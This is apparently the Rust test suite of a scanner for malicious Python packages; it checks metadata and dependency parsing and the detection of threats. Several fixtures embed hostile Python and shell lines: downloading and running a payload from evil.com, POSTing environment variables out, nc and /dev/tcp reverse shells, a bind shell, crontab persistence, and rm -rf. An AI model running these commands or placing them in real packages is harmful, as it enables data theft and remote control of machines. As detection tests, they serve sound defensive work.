use anyhow::Result;
use file_scanner::python_analysis::{analyze_python_package, PackageFormat, RiskLevel};
use flate2::Compression;
use flate2::write::GzEncoder;
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tar::{Builder, Header};
use tempfile::TempDir;
use zip::write::{SimpleFileOptions, ZipWriter};
use zip::CompressionMethod;

// Helper function to create a test wheel package
fn create_test_wheel(dir: &Path, name: &str, version: &str) -> Result<()> {
    let wheel_path = dir.join(format!("{}-{}-py3-none-any.whl", name, version));
    let file = File::create(&wheel_path)?;
    let mut zip = ZipWriter::new(file);
    
    // Add METADATA file
    let metadata = format!(
        r#"Metadata-Version: 2.1
Name: {}
Version: {}
Summary: Test wheel package
Author: Test Author
Author-email: test@example.com
License: MIT
Classifier: Programming Language :: Python :: 3
Classifier: License :: OSI Approved :: MIT License
Requires-Python: >=3.8
Requires-Dist: requests>=2.25.0
Requires-Dist: numpy<2.0.0
Provides-Extra: dev
Requires-Dist: pytest>=6.0.0; extra == 'dev'
"#,
        name, version
    );
    
    zip.start_file(format!("{}-{}.dist-info/METADATA", name, version), SimpleFileOptions::default())?;
    zip.write_all(metadata.as_bytes())?;
    
    // Add WHEEL file
    let wheel_info = r#"Wheel-Version: 1.0
Generator: test-wheel 1.0
Root-Is-Purelib: true
Tag: py3-none-any
"#;
    
    zip.start_file(format!("{}-{}.dist-info/WHEEL", name, version), SimpleFileOptions::default())?;
    zip.write_all(wheel_info.as_bytes())?;
    
    // Add a Python file
    zip.start_file(format!("{}/__init__.py", name), SimpleFileOptions::default())?;
    zip.write_all(b"# Test package\n__version__ = '1.0.0'\n")?;
    
    zip.finish()?;
    Ok(())
}

// Test wheel package analysis
#[test]
fn test_analyze_wheel_package() -> Result<()> {
    let temp_dir = TempDir::new()?;
    create_test_wheel(temp_dir.path(), "test-wheel-pkg", "1.0.0")?;
    
    let wheel_path = temp_dir.path().join("test-wheel-pkg-1.0.0-py3-none-any.whl");
    let analysis = analyze_python_package(&wheel_path)?;
    
    assert_eq!(analysis.package_info.name, "test-wheel-pkg");
    assert_eq!(analysis.package_info.version, "1.0.0");
    assert!(matches!(analysis.package_info.package_format, PackageFormat::Wheel));
    assert_eq!(analysis.package_info.author, Some("Test Author".to_string()));
    assert_eq!(analysis.package_info.license, Some("MIT".to_string()));
    
    // Check dependencies
    assert_eq!(analysis.dependencies.install_requires.len(), 2);
    assert!(analysis.dependencies.install_requires.contains_key("requests"));
    assert!(analysis.dependencies.install_requires.contains_key("numpy"));
    
    // Check extras
    assert!(analysis.dependencies.extras_require.contains_key("dev"));
    
    Ok(())
}

// Test tar.gz package analysis
#[test]
fn test_analyze_tar_gz_package() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let tar_gz_path = temp_dir.path().join("test-package-1.0.0.tar.gz");
    
    // Create a tar.gz file
    let tar_gz = File::create(&tar_gz_path)?;
    let enc = GzEncoder::new(tar_gz, Compression::default());
    let mut tar = Builder::new(enc);
    
    // Add setup.py
    let setup_py = r#"
from setuptools import setup

setup(
    name="test-tar-package",
    version="1.0.0",
    description="Test tar.gz package",
    author="Tar Author",
    author_email="tar@example.com",
    license="Apache-2.0",
    install_requires=[
        "django>=3.2",
        "pillow>=8.0",
    ],
    setup_requires=["wheel"],
    tests_require=["pytest"],
)
"#;
    
    let mut header = Header::new_gnu();
    header.set_path("test-package-1.0.0/setup.py")?;
    header.set_size(setup_py.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append(&header, setup_py.as_bytes())?;
    
    // Add PKG-INFO
    let pkg_info = r#"Metadata-Version: 1.2
Name: test-tar-package
Version: 1.0.0
Summary: Test tar.gz package
Author: Tar Author
Author-email: tar@example.com
License: Apache-2.0
"#;
    
    let mut header = Header::new_gnu();
    header.set_path("test-package-1.0.0/PKG-INFO")?;
    header.set_size(pkg_info.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append(&header, pkg_info.as_bytes())?;
    
    // Add setup.cfg
    let setup_cfg = r#"[metadata]
name = test-tar-package
version = 1.0.0

[options]
python_requires = >=3.7
"#;
    
    let mut header = Header::new_gnu();
    header.set_path("test-package-1.0.0/setup.cfg")?;
    header.set_size(setup_cfg.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append(&header, setup_cfg.as_bytes())?;
    
    // Add a Python file
    let py_file = "# Test module\nprint('Hello from tar.gz')\n";
    let mut header = Header::new_gnu();
    header.set_path("test-package-1.0.0/test_module.py")?;
    header.set_size(py_file.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    tar.append(&header, py_file.as_bytes())?;
    
    tar.finish()?;
    
    // Analyze the package
    let analysis = analyze_python_package(&tar_gz_path)?;
    
    assert_eq!(analysis.package_info.name, "test-tar-package");
    assert_eq!(analysis.package_info.version, "1.0.0");
    assert!(matches!(analysis.package_info.package_format, PackageFormat::SourceDistribution));
    assert_eq!(analysis.package_info.author, Some("Tar Author".to_string()));
    assert_eq!(analysis.package_info.license, Some("Apache-2.0".to_string()));
    
    // Check dependencies
    assert_eq!(analysis.dependencies.install_requires.len(), 2);
    assert_eq!(analysis.dependencies.setup_requires.len(), 1);
    assert_eq!(analysis.dependencies.tests_require.len(), 1);
    
    Ok(())
}

// Test zip package analysis
#[test]
fn test_analyze_zip_package() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let zip_path = temp_dir.path().join("test-package.zip");
    
    // Create a zip file
    let file = File::create(&zip_path)?;
    let mut zip = ZipWriter::new(file);
    
    // Add setup.py
    let setup_py = r#"
from setuptools import setup

setup(
    name="test-zip-package",
    version="2.0.0",
    description="Test zip package",
    install_requires=["beautifulsoup4>=4.9.0"],
)
"#;
    
    zip.start_file("test-package/setup.py", SimpleFileOptions::default().compression_method(CompressionMethod::Stored))?;
    zip.write_all(setup_py.as_bytes())?;
    
    // Add a Python file
    zip.start_file("test-package/main.py", SimpleFileOptions::default())?;
    zip.write_all(b"# Main module\nimport requests\n")?;
    
    zip.finish()?;
    
    // Analyze the package
    let analysis = analyze_python_package(&zip_path)?;
    
    assert_eq!(analysis.package_info.name, "test-zip-package");
    assert_eq!(analysis.package_info.version, "2.0.0");
    assert!(matches!(analysis.package_info.package_format, PackageFormat::SourceDistribution));
    
    Ok(())
}

// Test complex wheel metadata parsing
#[test]
fn test_complex_wheel_metadata() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("complex-1.0.0-py3-none-any.whl");
    
    let file = File::create(&wheel_path)?;
    let mut zip = ZipWriter::new(file);
    
    // Add complex METADATA
    let metadata = r#"Metadata-Version: 2.1
Name: complex-package
Version: 1.0.0
Summary: Complex metadata test
Home-page: https://example.com
Author: Complex Author
Author-email: complex@example.com
Maintainer: Complex Maintainer
Maintainer-email: maintainer@example.com
License: BSD-3-Clause
Project-URL: Bug Tracker, https://github.com/complex/issues
Project-URL: Documentation, https://complex.readthedocs.io
Project-URL: Source Code, https://github.com/complex/complex
Keywords: testing,complex,metadata
Platform: any
Classifier: Development Status :: 5 - Production/Stable
Classifier: Intended Audience :: Developers
Classifier: License :: OSI Approved :: BSD License
Classifier: Programming Language :: Python :: 3
Classifier: Programming Language :: Python :: 3.8
Classifier: Programming Language :: Python :: 3.9
Classifier: Programming Language :: Python :: 3.10
Requires-Python: >=3.8,<4.0
Description-Content-Type: text/markdown
Provides-Extra: all
Provides-Extra: dev
Provides-Extra: test
Provides-Extra: docs
Requires-Dist: requests (>=2.25.0,<3.0.0)
Requires-Dist: urllib3 (>=1.26.0,<2.0.0)
Requires-Dist: certifi (>=2020.12.5)
Requires-Dist: typing-extensions (>=3.7.4) ; python_version < "3.8"
Requires-Dist: importlib-metadata (>=3.6) ; python_version < "3.8"
Requires-Dist: pytest (>=6.0) ; extra == 'test'
Requires-Dist: pytest-cov (>=2.0) ; extra == 'test'
Requires-Dist: black (>=21.0) ; extra == 'dev'
Requires-Dist: mypy (>=0.900) ; extra == 'dev'
Requires-Dist: sphinx (>=4.0) ; extra == 'docs'
Requires-Dist: sphinx-rtd-theme (>=0.5) ; extra == 'docs'

# Complex Package

This is a complex package with rich metadata.
"#;
    
    zip.start_file("complex-1.0.0.dist-info/METADATA", SimpleFileOptions::default())?;
    zip.write_all(metadata.as_bytes())?;
    
    zip.finish()?;
    
    let analysis = analyze_python_package(&wheel_path)?;
    
    assert_eq!(analysis.package_info.name, "complex-package");
    assert_eq!(analysis.package_info.maintainer, Some("Complex Maintainer".to_string()));
    assert_eq!(analysis.package_info.maintainer_email, Some("maintainer@example.com".to_string()));
    assert_eq!(analysis.package_info.python_requires, Some(">=3.8,<4.0".to_string()));
    
    // Check project URLs
    assert_eq!(analysis.package_info.project_urls.len(), 3);
    assert_eq!(analysis.package_info.project_urls.get("Bug Tracker"), Some(&"https://github.com/complex/issues".to_string()));
    
    // Check keywords
    assert_eq!(analysis.package_info.keywords.len(), 3);
    assert!(analysis.package_info.keywords.contains(&"testing".to_string()));
    
    // Check classifiers
    assert!(analysis.package_info.classifiers.len() > 5);
    
    // Check dependencies with environment markers
    assert!(analysis.dependencies.install_requires.len() >= 3);
    
    // Check multiple extras
    assert_eq!(analysis.dependencies.extras_require.len(), 4);
    assert!(analysis.dependencies.extras_require.contains_key("test"));
    assert!(analysis.dependencies.extras_require.contains_key("dev"));
    assert!(analysis.dependencies.extras_require.contains_key("docs"));
    
    Ok(())
}

// Test malicious wheel package
#[test]
fn test_malicious_wheel_package() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("colourama-0.4.5-py3-none-any.whl");
    
    let file = File::create(&wheel_path)?;
    let mut zip = ZipWriter::new(file);
    
    // Add METADATA for typosquatting package
    let metadata = r#"Metadata-Version: 2.1
Name: colourama
Version: 0.4.5
Summary: Cross-platform colored terminal text
Author: Malicious Actor
License: MIT
Requires-Dist: requests
Requires-Dist: crypto
"#;
    
    zip.start_file("colourama-0.4.5.dist-info/METADATA", SimpleFileOptions::default())?;
    zip.write_all(metadata.as_bytes())?;
    
    // Add malicious Python file
    let malicious_py = r#"
import os
import subprocess
import base64

# Obfuscated malicious code
exec(base64.b64decode(b'aW1wb3J0IHNvY2tldA=='))

def install():
    # Download and execute payload
    subprocess.run(['curl', 'http://evil.com/payload', '-o', '/tmp/p'])
    os.system('chmod +x /tmp/p && /tmp/p')
    
    # Steal environment variables
    os.system('curl -X POST http://evil.com/data -d "$(env)"')
"#;
    
    zip.start_file("colourama/__init__.py", SimpleFileOptions::default())?;
    zip.write_all(malicious_py.as_bytes())?;
    
    zip.finish()?;
    
    let analysis = analyze_python_package(&wheel_path)?;
    
    // Check typosquatting detection
    assert!(analysis.malicious_indicators.typosquatting_risk.is_potential_typosquatting);
    
    // Check security analysis
    assert!(!analysis.security_analysis.suspicious_imports.is_empty());
    assert!(analysis.security_analysis.obfuscation_detected);
    assert!(!analysis.security_analysis.process_execution.is_empty());
    
    // Check risk level
    assert!(analysis.malicious_indicators.overall_risk_score > 60.0);
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        RiskLevel::High | RiskLevel::Critical
    ));
    
    Ok(())
}

// Test directory with recursive file scanning
#[test]
fn test_directory_recursive_scanning() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    // Create package structure
    fs::write(
        temp_dir.path().join("setup.py"),
        r#"from setuptools import setup
setup(name='recursive-test', version='1.0.0')"#
    )?;
    
    // Create nested directories
    fs::create_dir_all(temp_dir.path().join("tests"))?;
    fs::write(
        temp_dir.path().join("tests/test_main.py"),
        "import unittest\nimport subprocess\n"
    )?;
    
    fs::create_dir_all(temp_dir.path().join(".github/workflows"))?;
    fs::write(
        temp_dir.path().join(".github/workflows/ci.yml"),
        "name: CI\non: [push]\n"
    )?;
    
    fs::create_dir_all(temp_dir.path().join(".circleci"))?;
    fs::write(
        temp_dir.path().join(".circleci/config.yml"),
        "version: 2\n"
    )?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    // Should have scanned nested directories
    assert!(analysis.files_analysis.len() > 3);
    assert!(analysis.quality_metrics.has_tests);
    assert!(analysis.quality_metrics.has_ci_config);
    
    Ok(())
}

// Test package with network access patterns
#[test]
fn test_network_access_detection() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    let setup_py = r#"
import urllib.request
import requests
import socket

from setuptools import setup

# Suspicious network access
urllib.request.urlopen('http://suspicious.com/data')
requests.post('https://webhook.site/token', data={'key': 'value'})

# Socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 4444))

setup(
    name='network-test',
    version='1.0.0',
)
"#;
    
    fs::write(temp_dir.path().join("setup.py"), setup_py)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert!(!analysis.security_analysis.network_access_patterns.is_empty());
    assert!(analysis.security_analysis.data_exfiltration_risk);
    assert!(!analysis.security_analysis.suspicious_imports.is_empty());
    
    // Should find urllib and socket imports
    let suspicious_modules: Vec<&str> = analysis.security_analysis.suspicious_imports
        .iter()
        .map(|s| s.module_name.as_str())
        .collect();
    
    assert!(suspicious_modules.contains(&"urllib.request"));
    assert!(suspicious_modules.contains(&"socket"));
    
    Ok(())
}

// Test obfuscation detection
#[test]
fn test_obfuscation_detection() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    let setup_py = r#"
from setuptools import setup

# Various obfuscation techniques
import base64
import codecs

# Base64 encoded string
exec(base64.b64decode(b'cHJpbnQoIkhlbGxvIik='))

# Hex encoding
exec(codecs.decode('7072696e742822576f726c642229', 'hex'))

# String concatenation obfuscation
cmd = 'c' + 'u' + 'r' + 'l'
url = 'h' + 't' + 't' + 'p' + ':' + '/' + '/' + 'e' + 'v' + 'i' + 'l' + '.' + 'c' + 'o' + 'm'

# Lambda obfuscation
(lambda: __import__('os').system('whoami'))()

# Numeric character codes
''.join(chr(i) for i in [115, 121, 115, 116, 101, 109])

setup(name='obfuscated', version='1.0.0')
"#;
    
    fs::write(temp_dir.path().join("setup.py"), setup_py)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert!(analysis.security_analysis.obfuscation_detected);
    assert!(!analysis.setup_analysis.dangerous_operations.is_empty());
    
    Ok(())
}

// Test process execution detection
#[test]
fn test_process_execution_detection() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    let setup_py = r#"
import os
import subprocess
import sys

from setuptools import setup

# Various process execution methods
os.system('echo "Hello"')
os.popen('ls -la')
subprocess.run(['git', 'clone', 'https://github.com/evil/repo'])
subprocess.Popen(['nc', '-e', '/bin/sh', 'evil.com', '4444'])
subprocess.call('rm -rf /tmp/*', shell=True)

# Using exec and eval
exec('import os; os.system("id")')
eval('__import__("os").system("pwd")')

setup(name='process-exec', version='1.0.0')
"#;
    
    fs::write(temp_dir.path().join("setup.py"), setup_py)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert!(!analysis.security_analysis.process_execution.is_empty());
    assert!(analysis.security_analysis.process_execution.len() >= 5);
    
    // Check for dangerous operations
    assert!(!analysis.setup_analysis.dangerous_operations.is_empty());
    
    Ok(())
}

// Test backdoor detection
#[test]
fn test_backdoor_detection() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    let setup_py = r#"
import os
import socket
import subprocess

from setuptools import setup

# Reverse shell patterns
subprocess.Popen(['nc', '-e', '/bin/bash', 'attacker.com', '4444'])
os.system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')

# Bind shell
os.system('nc -lvp 4444 -e /bin/bash')

# Python reverse shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 9999))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/bash', '-i'])

# Persistence mechanism
os.system('echo "* * * * * python /tmp/backdoor.py" | crontab -')

setup(name='backdoor-test', version='1.0.0')
"#;
    
    fs::write(temp_dir.path().join("setup.py"), setup_py)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert!(!analysis.security_analysis.backdoor_indicators.is_empty());
    
    // Check for reverse shell indicators
    let has_reverse_shell = analysis.security_analysis.backdoor_indicators
        .iter()
        .any(|b| b.indicator_type.contains("reverse shell"));
    assert!(has_reverse_shell);
    
    Ok(())
}

// Test dependency confusion detection
#[test]
fn test_wheel_dependency_confusion() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("internal-auth-lib-1.0.0-py3-none-any.whl");
    
    let file = File::create(&wheel_path)?;
    let mut zip = ZipWriter::new(file);
    
    let metadata = r#"Metadata-Version: 2.1
Name: internal-auth-lib
Version: 1.0.0
Summary: Internal authentication library
Requires-Dist: requests
Requires-Dist: company-common-utils
Requires-Dist: private-config-manager
"#;
    
    zip.start_file("internal-auth-lib-1.0.0.dist-info/METADATA", SimpleFileOptions::default())?;
    zip.write_all(metadata.as_bytes())?;
    
    zip.finish()?;
    
    let analysis = analyze_python_package(&wheel_path)?;
    
    assert!(analysis.malicious_indicators.dependency_confusion_risk);
    
    Ok(())
}

// Test file type detection
#[test]
fn test_python_file_type_detection() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    // Create various Python file types
    fs::write(temp_dir.path().join("setup.py"), "# setup")?;
    fs::write(temp_dir.path().join("module.py"), "# module")?;
    fs::write(temp_dir.path().join("test_module.py"), "# test")?;
    fs::write(temp_dir.path().join("conftest.py"), "# pytest config")?;
    fs::write(temp_dir.path().join("__init__.py"), "# init")?;
    fs::write(temp_dir.path().join("compiled.pyc"), [0u8; 16])?; // Fake pyc
    fs::write(temp_dir.path().join("optimized.pyo"), [0u8; 16])?; // Fake pyo
    fs::write(temp_dir.path().join("extension.pyd"), [0u8; 16])?; // Fake pyd
    fs::write(temp_dir.path().join("shared.so"), [0u8; 16])?; // Fake so
    fs::write(temp_dir.path().join("requirements.txt"), "requests==2.25.0")?;
    fs::write(temp_dir.path().join("README.rst"), "README")?;
    fs::write(temp_dir.path().join("setup.cfg"), "[metadata]")?;
    fs::write(temp_dir.path().join("pyproject.toml"), "[tool.poetry]")?;
    fs::write(temp_dir.path().join(".gitignore"), "*.pyc")?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    // Check that various file types were detected
    let file_types: Vec<&str> = analysis.files_analysis
        .iter()
        .map(|f| f.file_type.as_str())
        .collect();
    
    assert!(file_types.contains(&"Setup Script"));
    assert!(file_types.contains(&"Python Module"));
    assert!(file_types.contains(&"Test File"));
    assert!(file_types.contains(&"Config"));
    assert!(file_types.contains(&"Init File"));
    assert!(file_types.contains(&"Compiled Python"));
    assert!(file_types.contains(&"Requirements"));
    assert!(file_types.contains(&"Documentation"));
    
    Ok(())
}

// Test complex dependency parsing
#[test]
fn test_complex_dependency_parsing() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    let setup_py = r#"
from setuptools import setup

# Complex dependency specifications
setup(
    name='complex-deps',
    version='1.0.0',
    install_requires=[
        'requests>=2.25.0,<3.0.0',
        'Django>=3.2,<4.0; python_version>="3.8"',
        'numpy>=1.19.0; platform_system=="Linux"',
        'typing-extensions>=3.7.4; python_version<"3.8"',
        'git+https://github.com/user/repo.git@v1.0#egg=custom-package',
        'https://files.pythonhosted.org/packages/source/p/package/package-1.0.tar.gz',
        'file:../local-package',
    ],
    extras_require={
        'dev': [
            'pytest>=6.0',
            'black==21.5b0',
            'mypy>=0.900,<1.0',
        ],
        'docs': ['sphinx>=4.0', 'sphinx-rtd-theme'],
        'all': ['package[dev,docs]'],
    },
    setup_requires=[
        'wheel>=0.36.0',
        'setuptools-scm>=6.0',
    ],
    tests_require=[
        'pytest>=6.0',
        'pytest-cov>=2.0',
        'tox>=3.0',
    ],
)
"#;
    
    fs::write(temp_dir.path().join("setup.py"), setup_py)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    // Check various dependency types
    assert!(analysis.dependencies.install_requires.len() >= 6);
    
    // Check URL and Git dependencies
    let has_git_dep = analysis.dependencies.install_requires.values()
        .any(|d| d.is_git);
    let has_url_dep = analysis.dependencies.install_requires.values()
        .any(|d| d.is_url);
    
    assert!(has_git_dep);
    assert!(has_url_dep);
    
    // Check extras
    assert_eq!(analysis.dependencies.extras_require.len(), 3);
    assert!(analysis.dependencies.extras_require.get("dev").unwrap().len() >= 3);
    
    // Check setup and test requirements
    assert_eq!(analysis.dependencies.setup_requires.len(), 2);
    assert_eq!(analysis.dependencies.tests_require.len(), 3);
    
    Ok(())
}

// Test error handling for corrupted archives
#[test]
fn test_corrupted_wheel() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("corrupted.whl");
    
    // Create a corrupted wheel file
    fs::write(&wheel_path, b"This is not a valid zip file")?;
    
    let result = analyze_python_package(&wheel_path);
    assert!(result.is_err());
    
    Ok(())
}

#[test]
fn test_corrupted_tar_gz() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let tar_path = temp_dir.path().join("corrupted.tar.gz");
    
    // Create a corrupted tar.gz file
    fs::write(&tar_path, b"This is not a valid tar.gz file")?;
    
    let result = analyze_python_package(&tar_path);
    assert!(result.is_err());
    
    Ok(())
}

// Test missing metadata in wheel
#[test]
fn test_wheel_missing_metadata() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("no-metadata.whl");
    
    let file = File::create(&wheel_path)?;
    let mut zip = ZipWriter::new(file);
    
    // Add only a Python file, no METADATA
    zip.start_file("package/__init__.py", SimpleFileOptions::default())?;
    zip.write_all(b"# Package without metadata")?;
    
    zip.finish()?;
    
    let result = analyze_python_package(&wheel_path);
    assert!(result.is_err());
    
    Ok(())
}

// Test pyproject.toml with different build systems
#[test]
fn test_pyproject_toml_build_systems() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    // Test with setuptools backend
    let pyproject_setuptools = r#"
[build-system]
requires = ["setuptools>=61.0", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "setuptools-project"
version = "1.0.0"
description = "Test setuptools project"
dependencies = [
    "requests>=2.28.0",
]

[project.optional-dependencies]
dev = ["pytest>=7.0"]
"#;
    
    fs::write(temp_dir.path().join("pyproject.toml"), pyproject_setuptools)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert_eq!(analysis.package_info.name, "setuptools-project");
    assert!(analysis.dependencies.install_requires.contains_key("requests"));
    
    // Test with poetry
    fs::remove_file(temp_dir.path().join("pyproject.toml"))?;
    
    let pyproject_poetry = r#"
[tool.poetry]
name = "poetry-project"
version = "2.0.0"
description = "Test poetry project"

[tool.poetry.dependencies]
python = "^3.9"
flask = "^2.3.0"

[tool.poetry.group.dev.dependencies]
black = "^23.0.0"

[build-system]
requires = ["poetry-core"]
build-backend = "poetry.core.masonry.api"
"#;
    
    fs::write(temp_dir.path().join("pyproject.toml"), pyproject_poetry)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert_eq!(analysis.package_info.name, "poetry-project");
    assert!(analysis.dependencies.install_requires.contains_key("flask"));
    
    Ok(())
}

// Test setup.py with custom commands
#[test]
fn test_setup_py_custom_commands() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    let setup_py = r#"
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info

class CustomInstall(install):
    def run(self):
        # Custom installation logic
        import os
        os.system('echo "Custom install"')
        install.run(self)

class CustomDevelop(develop):
    def run(self):
        # Custom develop logic
        develop.run(self)

class CustomEggInfo(egg_info):
    def run(self):
        # Custom egg_info logic
        egg_info.run(self)

setup(
    name='custom-commands',
    version='1.0.0',
    cmdclass={
        'install': CustomInstall,
        'develop': CustomDevelop,
        'egg_info': CustomEggInfo,
    },
)
"#;
    
    fs::write(temp_dir.path().join("setup.py"), setup_py)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert!(analysis.security_analysis.has_install_script);
    assert!(!analysis.setup_analysis.custom_commands.is_empty());
    
    Ok(())
}

// Test maintainer analysis
#[test]
fn test_maintainer_analysis() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("maintained-1.0.0-py3-none-any.whl");
    
    let file = File::create(&wheel_path)?;
    let mut zip = ZipWriter::new(file);
    
    let metadata = r#"Metadata-Version: 2.1
Name: maintained-package
Version: 1.0.0
Author: Original Author
Author-email: original@example.com
Maintainer: Current Maintainer
Maintainer-email: maintainer@example.com
License: MIT
"#;
    
    zip.start_file("maintained-1.0.0.dist-info/METADATA", SimpleFileOptions::default())?;
    zip.write_all(metadata.as_bytes())?;
    
    zip.finish()?;
    
    let analysis = analyze_python_package(&wheel_path)?;
    
    // Check maintainer information
    assert_eq!(analysis.maintainer_analysis.maintainers.len(), 1);
    assert_eq!(analysis.maintainer_analysis.maintainers[0].name, "Current Maintainer");
    assert_eq!(analysis.maintainer_analysis.maintainers[0].email, Some("maintainer@example.com".to_string()));
    
    Ok(())
}

// Test imports analysis in Python files
#[test]
fn test_python_imports_analysis() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    fs::write(
        temp_dir.path().join("setup.py"),
        "from setuptools import setup\nsetup(name='imports-test', version='1.0.0')"
    )?;
    
    // Create Python files with various imports
    fs::write(
        temp_dir.path().join("suspicious.py"),
        r#"
import os
import subprocess
import socket
import base64
import pickle
import marshal
import imp
import importlib
import ctypes
import multiprocessing
from urllib import request
from cryptography.fernet import Fernet
"#
    )?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    // Should detect suspicious imports in files
    let has_suspicious_file = analysis.files_analysis.iter()
        .any(|f| !f.imports.is_empty() || !f.suspicious_content.is_empty());
    
    // The analysis should flag some security concerns
    assert!(has_suspicious_file || !analysis.security_analysis.suspicious_imports.is_empty());
    
    Ok(())
}

// Test edge case: empty wheel file
#[test]
fn test_empty_wheel() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("empty.whl");
    
    let file = File::create(&wheel_path)?;
    let zip = ZipWriter::new(file);
    zip.finish()?;
    
    let result = analyze_python_package(&wheel_path);
    assert!(result.is_err());
    
    Ok(())
}

// Test package without extension detection
#[test]
fn test_package_without_extension() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let no_ext_path = temp_dir.path().join("package_no_ext");
    
    // Create a wheel file without .whl extension
    let file = File::create(&no_ext_path)?;
    let mut zip = ZipWriter::new(file);
    
    let metadata = r#"Metadata-Version: 2.1
Name: no-ext-package
Version: 1.0.0
"#;
    
    zip.start_file("no-ext-package-1.0.0.dist-info/METADATA", SimpleFileOptions::default())?;
    zip.write_all(metadata.as_bytes())?;
    
    zip.finish()?;
    
    // Should still be able to analyze if it's a valid zip
    let result = analyze_python_package(&no_ext_path);
    // This might fail as the code checks extensions, which is expected
    assert!(result.is_err() || result.unwrap().package_info.name == "no-ext-package");
    
    Ok(())
}

// Test very large metadata handling
#[test]
fn test_large_metadata() -> Result<()> {
    let temp_dir = TempDir::new()?;
    let wheel_path = temp_dir.path().join("large-metadata.whl");
    
    let file = File::create(&wheel_path)?;
    let mut zip = ZipWriter::new(file);
    
    // Create metadata with many classifiers and dependencies
    let mut metadata = String::from(r#"Metadata-Version: 2.1
Name: large-metadata-package
Version: 1.0.0
"#);
    
    // Add many classifiers
    for i in 0..100 {
        metadata.push_str(&format!("Classifier: Test Classifier {}\n", i));
    }
    
    // Add many dependencies
    for i in 0..50 {
        metadata.push_str(&format!("Requires-Dist: package-{} (>=1.0.0)\n", i));
    }
    
    zip.start_file("large-metadata-1.0.0.dist-info/METADATA", SimpleFileOptions::default())?;
    zip.write_all(metadata.as_bytes())?;
    
    zip.finish()?;
    
    let analysis = analyze_python_package(&wheel_path)?;
    
    assert_eq!(analysis.package_info.classifiers.len(), 100);
    assert_eq!(analysis.dependencies.install_requires.len(), 50);
    
    Ok(())
}

// Test special characters in metadata
#[test]
fn test_special_characters_in_metadata() -> Result<()> {
    let temp_dir = TempDir::new()?;
    
    let setup_py = r#"# -*- coding: utf-8 -*-
from setuptools import setup

setup(
    name='spëcial-çhars',
    version='1.0.0',
    description='Package with spëcial çharacters and émojis 🎉',
    author='Authör Nåme',
    author_email='tëst@example.com',
    keywords=['ünicode', 'tëst', '中文', '日本語', 'émoji🎉'],
)
"#;
    
    fs::write(temp_dir.path().join("setup.py"), setup_py)?;
    
    let analysis = analyze_python_package(temp_dir.path())?;
    
    assert_eq!(analysis.package_info.name, "spëcial-çhars");
    assert!(analysis.package_info.description.unwrap().contains("émojis"));
    assert_eq!(analysis.package_info.keywords.len(), 5);
    
    Ok(())
}